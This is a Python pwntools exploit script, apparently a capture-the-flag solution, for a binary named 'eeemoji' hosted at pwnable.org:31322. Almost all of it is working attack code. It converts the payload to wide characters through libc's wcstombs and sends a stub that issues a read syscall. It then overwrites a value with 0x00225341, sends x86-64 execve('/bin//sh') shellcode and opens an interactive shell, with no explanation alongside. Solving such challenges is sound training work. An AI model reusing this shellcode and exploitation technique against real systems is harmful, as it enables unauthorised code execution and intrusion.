# coding:utf-8
import ctypes
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

LIBC = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')
TARGET = './eeemoji'
HOST = 'pwnable.org'
PORT = 31322

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def decode(array) :
    ptr = ctypes.create_string_buffer(len(array)*4)
    LIBC.mbstowcs(ptr,array,len(array)*4)
    return ptr.value

def encode(array) :
    ptr = ctypes.create_string_buffer(len(array)*4)
    LIBC.wcstombs(ptr,array,len(array)*4)
    if len(ptr.value) == 0:
        print "encode error: cant generate bytes."
    return ptr.value

LIBC.setlocale(0, "en_US.UTF-8")
r = start()
if args.D:
    debug(r, [0xc0a, 0xc76])

r.sendlineafter('🐮🍺\n', '🍺')
r.sendlineafter('🐮🍺\n', '🐴')

_64_SHELLCODE = "\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

payload = ''
payload += 'A'*4
payload += asm('xor eax, eax')
payload += asm('xor rdi, rdi')
# payload += asm('nop')
payload += asm('syscall')
payload = payload.ljust(0x80*4, 'A')
payload += p32(0x00225341)
print payload

# payload += encode(p32(0x1337)*0x80+p32(0x2225341))
# payload += encode(p32(0x001c3c3))*(0x80-1)+encode(p32(0x00225341))

r.sendafter('🐴😓\n', encode(payload))
print len(_64_SHELLCODE)
r.send('X'*0xb+_64_SHELLCODE)

r.interactive()
r.close()
